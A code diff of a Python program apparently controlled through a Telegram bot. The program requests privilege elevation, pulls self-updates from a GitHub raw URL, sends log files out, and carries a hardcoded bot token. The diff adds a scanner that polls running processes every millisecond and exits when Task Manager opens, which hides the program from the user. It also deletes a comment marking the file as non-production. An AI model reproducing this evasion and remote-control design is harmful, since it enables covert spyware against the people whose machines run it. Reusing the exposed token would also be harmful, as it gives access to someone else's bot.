@@ -16,9 +16,11 @@ from telegram import ForceReply, Update
 from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
 from elevate import elevate
 from win32com.shell import shell
+import multiprocessing
 from multiprocessing import Process
+import time
 
-#dev_file strictly for use in non-production sw.
+
 
 file=sys.argv[0] 
 #Token for the telegram bot.
@@ -26,6 +28,38 @@ token="6199318379:AAGmrDxxhYeYWabD8MqyrMMwKvVztDkPhGE"
 #url for online update source
 url="https://raw.githubusercontent.com/Mainakdey1/PythonStuff/main/development_file.py"
 
+
+
+
+
+class process_scanner:
+    
+
+    def __init__(self,_obj_name,_hidev=False) -> True:
+        self._obj_name=_obj_name
+        self._hidev=_hidev
+
+    def start_scan(self,_interval):
+        self._interval=_interval
+
+        while self._hidev==False:
+            import time
+            time.sleep(self._interval)
+            import subprocess
+            processes=subprocess.check_output("tasklist")
+            if "Taskmgr.exe" in str(processes):
+
+                self._hidev=True
+
+        if self._hidev==True:
+            return False
+        
+    def scan_stop(self):
+        self._hidev=False
+
+    def show_hide_value(self):
+        return self._hidev,__name__
+ 
 
 
 class logger:
@@ -77,7 +111,7 @@ class logger:
 
 
 
-__version__=1.06
+__version__=1.07
 
 
 
@@ -327,8 +361,28 @@ else:
             logins.info("LOGFILE ACCESS","FILE SENT ")
         except:
             logins.warning("LOGFILE ACCESS","UNSUCCESSFUL")
+
+
+
+
+    ret={'main_hidev': False}
+
+    def start_subprocess(queue):
+        ret=queue.get()
+        apr=process_scanner("scA")
+        apr.start_scan(0.001)
+        ret['main_hidev']=True
+        queue.put(ret)
+
+
+
+
+
     
     #Main
+
+
+
 
     def main() -> None:
         """Start the bot."""
@@ -361,11 +415,25 @@ else:
         logins.info("MAIN","COMMAND LINE INITIATED")
     except:
         logins.critical("MAIN","UNKNOW ERROR")
-    if __name__ == "__main__":
 
-        main_process=Process(main())
-        main_process.start()
     
+    def end_main_process():
+        sys.exit()
+
+    if __name__ == "__main__":
+        queue=multiprocessing.Queue()
+        queue.put(ret)
+        p=Process(target=start_subprocess,args=(queue,))
+        p.start()
+        pmain=Process(target=main)
+        pmain.start()
+        pmain.join()
+
+        if queue.get()['main_hidev']==True:
+            end_main_process()
+
+
+
 
 
 
